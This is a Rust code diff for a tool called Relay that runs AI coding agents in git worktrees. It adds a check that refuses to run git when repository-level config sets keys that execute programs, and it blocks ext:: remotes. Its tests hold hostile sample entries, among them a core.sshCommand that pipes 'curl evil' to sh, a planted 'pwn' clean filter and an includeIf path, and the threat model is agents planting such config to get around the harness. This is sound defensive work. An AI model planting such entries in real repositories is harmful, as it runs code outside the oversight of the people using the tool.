@@ -56,11 +56,15 @@ fn run(program: &str, dir: &Path, args: &[&str]) -> anyhow::Result<String> {
         // Environment-scope config outranks every config file, and is inherited by the git
         // processes `gh` spawns. Both keys execute arbitrary commands and can be pointed at
         // agent-written files, so they are off for everything Relay runs (see `worktree_git`).
-        .env("GIT_CONFIG_COUNT", "2")
+        .env("GIT_CONFIG_COUNT", "3")
         .env("GIT_CONFIG_KEY_0", "core.fsmonitor")
         .env("GIT_CONFIG_VALUE_0", "false")
         .env("GIT_CONFIG_KEY_1", "core.hooksPath")
         .env("GIT_CONFIG_VALUE_1", "/dev/null")
+        // `ext::` remote URLs run a command; git refuses them by default, and this keeps a
+        // repo-level override from turning them back on.
+        .env("GIT_CONFIG_KEY_2", "protocol.ext.allow")
+        .env("GIT_CONFIG_VALUE_2", "never")
         .output()?;
     if output.status.success() {
         return Ok(String::from_utf8_lossy(&output.stdout).trim().to_string());
@@ -104,6 +108,79 @@ fn trusted_git_dir(workspace: &TaskWorkspace) -> anyhow::Result<PathBuf> {
         "git has no record of the worktree at {}; it may have been moved or tampered with",
         workspace.worktree_path
     )
+}
+
+/// Repository-level config entries (`local`/`worktree` scope, from `git config --show-scope
+/// --list` output) that make git run a program. Agents dispatched *without* a worktree run in
+/// the project checkout itself, where `.git/config` is inside their working folder, so any of
+/// these could have been planted there. Global and system config are the user's own and are
+/// trusted. `core.fsmonitor`/`core.hooksPath` are not listed: `run` force-disables both, and
+/// tools like husky legitimately set a repo-level hooks path. Git LFS's own filter is allowed.
+pub fn unsafe_repo_config(listing: &str) -> Vec<String> {
+    listing
+        .lines()
+        .filter_map(|line| {
+            let (scope, entry) = line.split_once('\t')?;
+            if scope != "local" && scope != "worktree" {
+                return None;
+            }
+            let (key, value) = entry.split_once('=').unwrap_or((entry, ""));
+            let key_lower = key.to_lowercase();
+            is_exec_config(&key_lower, value).then(|| key.to_string())
+        })
+        .collect()
+}
+
+fn is_exec_config(key: &str, value: &str) -> bool {
+    let ends = |suffix: &str| key.ends_with(suffix);
+    let starts = |prefix: &str| key.starts_with(prefix);
+    if starts("filter.lfs.") {
+        let value = value.trim();
+        return !(value == "true" || value == "false" || value.starts_with("git-lfs "));
+    }
+    matches!(
+        key,
+        "core.sshcommand"
+            | "core.gitproxy"
+            | "core.askpass"
+            | "core.pager"
+            | "core.editor"
+            | "core.alternaterefscommand"
+            | "sequence.editor"
+            | "diff.external"
+            | "gpg.program"
+            | "credential.helper"
+            | "include.path"
+            | "uploadpack.packobjectshook"
+    ) || starts("includeif.")
+        || starts("filter.")
+        || (starts("gpg.") && ends(".program"))
+        || (starts("credential.") && ends(".helper"))
+        || (starts("diff.") && (ends(".command") || ends(".textconv")))
+        || (starts("merge.") && ends(".driver"))
+        || (starts("remote.") && (ends(".uploadpack") || ends(".receivepack")))
+        || (starts("protocol.") && ends(".allow") && value.trim() == "always")
+}
+
+/// Fails closed, before any git command that could act on it, when repository-level config
+/// would make git run a program (see `unsafe_repo_config`). Reading config runs nothing.
+fn ensure_safe_config(listing: &str) -> anyhow::Result<()> {
+    let found = unsafe_repo_config(listing);
+    anyhow::ensure!(
+        found.is_empty(),
+        "refusing to run git: the repository's own config (.git/config) sets {} which can run \
+         programs and could have been written by an agent. Review it, and move anything you \
+         set yourself to your global git config (`git config --global`).",
+        found.join(", ")
+    );
+    Ok(())
+}
+
+fn ensure_safe_worktree_config(workspace: &TaskWorkspace) -> anyhow::Result<()> {
+    ensure_safe_config(&worktree_git(
+        workspace,
+        &["config", "--show-scope", "--list"],
+    )?)
 }
 
 /// Runs git inside a task's worktree with the repository pinned to `trusted_git_dir`, so
@@ -289,6 +366,8 @@ pub fn prepare_workspace(
         )
     })?;
     let repo_root = PathBuf::from(repo_root);
+    // `worktree add` checks files out, which runs any configured smudge filter.
+    ensure_safe_config(&git(&repo_root, &["config", "--show-scope", "--list"])?)?;
     git(&repo_root, &["rev-parse", "--verify", "HEAD"])
         .map_err(|_| anyhow::anyhow!("the repository has no commits yet; commit once first"))?;
     let base_branch = current_branch(&repo_root)
@@ -346,6 +425,7 @@ pub fn ensure_worktree(workspace: &TaskWorkspace) -> anyhow::Result<bool> {
         return Ok(false);
     }
     let repo = Path::new(&workspace.repo_root);
+    ensure_safe_config(&git(repo, &["config", "--show-scope", "--list"])?)?;
     // Drop git's bookkeeping for the vanished directory, or `worktree add` refuses the path.
     git(repo, &["worktree", "prune"])?;
     git(
@@ -389,6 +469,8 @@ pub fn ship(workspace: &TaskWorkspace, context: &ShipContext) -> anyhow::Result<
         "the task's worktree at {} no longer exists",
         workspace.worktree_path
     );
+    // First, before `git status`/`add`/`push`, any of which can invoke filters or ssh.
+    ensure_safe_worktree_config(workspace)?;
     let committed = commit_all(workspace, &commit_message(context))?;
     if commits_ahead(workspace)? == 0 {
         return Ok(ShipOutcome {
@@ -468,6 +550,7 @@ pub fn remove_worktree(workspace: &TaskWorkspace) -> anyhow::Result<bool> {
     if !worktree.is_dir() {
         return Ok(true);
     }
+    ensure_safe_worktree_config(workspace)?;
     if is_dirty(workspace)? {
         return Ok(false);
     }
@@ -560,6 +643,40 @@ mod tests {
         let mut no_summary = context("Fix login", "p");
         no_summary.summary = Some("   ");
         assert!(pr_body(&no_summary, "b").contains("did not leave a final summary"));
+    }
+
+    #[test]
+    fn repo_level_exec_config_is_flagged_but_user_config_and_lfs_are_not() {
+        let listing = "\
+global\tcore.sshcommand=ssh -i ~/.ssh/work
+system\tcredential.helper=osxkeychain
+local\tremote.origin.url=git@github.com:o/r.git
+local\tcore.hookspath=.husky
+local\tcore.fsmonitor=true
+local\tfilter.lfs.clean=git-lfs clean -- %f
+local\tfilter.lfs.required=true
+local\tcore.sshCommand=sh -c 'curl evil | sh'
+worktree\tgpg.ssh.program=/tmp/x
+local\tfilter.pwn.clean=./pwn.sh
+local\tincludeIf.gitdir:/tmp/.path=/tmp/evil
+local\tprotocol.file.allow=always
+local\tprotocol.file.allow=user
+command\tcore.pager=less";
+        assert_eq!(
+            unsafe_repo_config(listing),
+            vec![
+                "core.sshCommand",
+                "gpg.ssh.program",
+                "filter.pwn.clean",
+                "includeIf.gitdir:/tmp/.path",
+                "protocol.file.allow",
+            ]
+        );
+        assert!(ensure_safe_config("local\tuser.name=me").is_ok());
+        let error = ensure_safe_config("local\tdiff.x.textconv=./t").unwrap_err();
+        assert!(error.to_string().contains("diff.x.textconv"));
+        let spoofed_lfs = "local\tfilter.lfs.process=sh -c evil";
+        assert_eq!(unsafe_repo_config(spoofed_lfs), vec!["filter.lfs.process"]);
     }
 
     #[test]
@@ -668,6 +785,28 @@ mod tests {
         );
         assert_eq!(log, "feat: add a greeting");
         std::fs::write(&dot_git, real_dot_git).unwrap();
+
+        // A clean filter planted in the repository's own config (as an agent running in the
+        // main checkout could do) must stop Relay before `git status`/`add` can invoke it.
+        let filter_marker = base.join("filter-ran");
+        let filter_cmd = format!("touch '{}'; cat", filter_marker.display());
+        g(
+            Path::new(&ws.repo_root),
+            &["config", "filter.pwn.clean", &filter_cmd],
+        );
+        std::fs::write(
+            Path::new(&ws.worktree_path).join(".gitattributes"),
+            "* filter=pwn\n",
+        )
+        .unwrap();
+        let error = ship(&ws, &context("Add a greeting", "p")).unwrap_err();
+        assert!(error.to_string().contains("filter.pwn.clean"), "{error}");
+        assert!(!filter_marker.exists(), "the planted filter must never run");
+        g(
+            Path::new(&ws.repo_root),
+            &["config", "--unset", "filter.pwn.clean"],
+        );
+        std::fs::remove_file(Path::new(&ws.worktree_path).join(".gitattributes")).unwrap();
         assert!(
             !marker.exists(),
             "Relay's commit must never run repository hooks"
